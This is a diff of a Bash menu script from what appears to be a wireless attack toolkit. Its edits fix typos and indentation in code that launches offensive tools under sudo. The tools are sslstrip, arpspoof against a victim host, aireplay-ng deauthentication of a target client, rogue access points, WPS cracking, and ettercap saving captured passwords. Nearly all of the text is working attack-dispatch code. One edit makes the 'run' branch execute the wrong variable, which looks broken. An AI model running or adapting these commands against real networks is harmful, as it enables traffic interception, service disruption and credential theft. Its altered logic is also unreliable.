@@ -57,7 +57,7 @@ menu()
         INTERFACE="Advanced"
     elif [[ $CHOICE == "simple" || $CHOICE == "basic" || $CHOICE == "Simple" || $CHOICE == "Basic" ]]; then
         INTERFACE="Basic"
-    #The current defined menu options are compleated
+    #The current defined menu options are completed
     ################################################################################################################################################
     #Now we look for user actions
     elif [[ $CHOICE == "quit" || $CHOICE == "exit" ]]; then
@@ -81,31 +81,31 @@ menu()
 	    3) [[ $ATTACK == "WPS" ]] && sudo xterm -bg black -fg DodgerBlue1 -T "Wash" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./wash ; bash\"" 2>&1 || sudo xterm -bg black -fg DodgerBlue1 -T "Dump cap" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./dump ; bash\"" 2>&1 ;;
 	    4) sudo xterm -bg black -fg DodgerBlue1 -T "Cracking" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./cracking ; bash\"" &>/dev/null & ;;
 	    5) if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "Airbase" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./airbase ; bash\"" &>/dev/null &
+		        sudo xterm -bg black -fg DodgerBlue1 -T "Airbase" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./airbase ; bash\"" &>/dev/null &
 	       elif [[ $ATTACK == "WPS" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "Bully" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null &
+		       sudo xterm -bg black -fg DodgerBlue1 -T "Bully" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null &
 	       elif [[ $ATTACK == "SslStrip" ]]; then
-		  echo -e "SSL Strip Log File\n" > ${SESSIONFOLDER}ssl.log 
-		  sudo xterm -bg black -fg DodgerBlue1 -T "SSL Strip" -geometry 50x5 -e "bash -ic \"sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log ; bash\"" &>/dev/null &
-		  #sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log &>/dev/null &		
+		      echo -e "SSL Strip Log File\n" > ${SESSIONFOLDER}ssl.log 
+		      sudo xterm -bg black -fg DodgerBlue1 -T "SSL Strip" -geometry 50x5 -e "bash -ic \"sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log ; bash\"" &>/dev/null &
+		      #sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log &>/dev/null &		
 	       elif [[ $ATTACK == "WPE" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 50x5 -e "bash -ic \"${DIR_MODULES}./wpe ; bash\"" &>/dev/null & #sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
+		      sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 50x5 -e "bash -ic \"${DIR_MODULES}./wpe ; bash\"" &>/dev/null & #sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
 	       elif [[ $ATTACK == "EAP" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "EAP" -geometry 50x5 -e "bash -ic \"${DIR_MODULES}./eap ; bash\"" &>/dev/null &
+		      sudo xterm -bg black -fg DodgerBlue1 -T "EAP" -geometry 50x5 -e "bash -ic \"${DIR_MODULES}./eap ; bash\"" &>/dev/null &
 	       elif [[ $ATTACK == "ArpSpoof" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "ArpSpoof" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null & #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
-	      fi
+		      sudo xterm -bg black -fg DodgerBlue1 -T "ArpSpoof" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null & #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
+	      fi ;;
 	     6) sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./firewall ; bash\"" &>/dev/null & ;;
-	     7) sudo xtemr -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null & ;;
+	     7) sudo xterm -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null & ;;
 	     8) [[ ! -f ${SESSIONFOLDER}recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}recovered_passwords.pcap
 		if [[ $BRIDGED == "True" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
+		    sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
 		elif [[ $AP_NAME == "AIRBASE" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap at0" -geometry 90x20 -e "bash -ic \"ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
+		    sudo xterm -bg black -fg DodgerBlue1 -T "ettercap at0" -geometry 90x20 -e "bash -ic \"ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
 		elif [[ $AP_NAME == "HOSTAPD" ]]; then
-		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap $IFACE1" -geometry 90x20 -e "bash -ic \"ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
+		    sudo xterm -bg black -fg DodgerBlue1 -T "ettercap $IFACE1" -geometry 90x20 -e "bash -ic \"ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
 		fi
-	        ;;
+    ;;
 	esac
     else
         ###########################################################################################################################
@@ -115,11 +115,11 @@ menu()
             if [[ $CHOICE == "use"* ]]; then
                 cut_choice $CHOICE
                 echo "use=$CHOICE"
-                [[ ! -f ${DIR_MODULES}$CHOICE ]] && echo "${BLD_TEA}JarJar, yousa seem to be confused.${TXT_RST}" || RUN=$CHOICE
+                [[ ! -f ${DIR_MODULES}$CHOICE ]] && echo "${BLD_TEA}JarJar, yousa seem to be confused.${TXT_RST}"
             elif [[ $CHOICE == "run" ]]; then # Check if the CHOICE is empty before trying to execute
-                [[ -n $CHOICE ]] && sudo xterm -bg black -fg DodgerBlue1 -T "N4P Advanced runtime" -geometry 65x15 -e "bash -ic \"${DIR_MODULES}./$RUN ; bash\"" &>/dev/null & || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
+                [[ -n $CHOICE ]] && sudo xterm -bg black -fg DodgerBlue1 -T "N4P Advanced runtime" -geometry 65x15 -e "bash -ic \"${DIR_MODULES}./$CHOICE ; bash\"" &>/dev/null || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
             elif [[ $CHOICE == "show options" ]]; then
-		[[ -n $RUN ]] && grep get_name\ \" ${DIR_MODULES}$RUN | cut -d '"' -f 2 || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
+		[[ -n $CHOICE ]] && grep get_name\ \" ${DIR_MODULES}$CHOICE | cut -d '"' -f 2 || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
             elif [[ $CHOICE == "list modules" || $CHOICE == "show modules" ]]; then
 		printf %s "$(ls ${DIR_MODULES})"
             elif [[ $CHOICE = set* ]]; then #We may in future make variables dynamic from the module
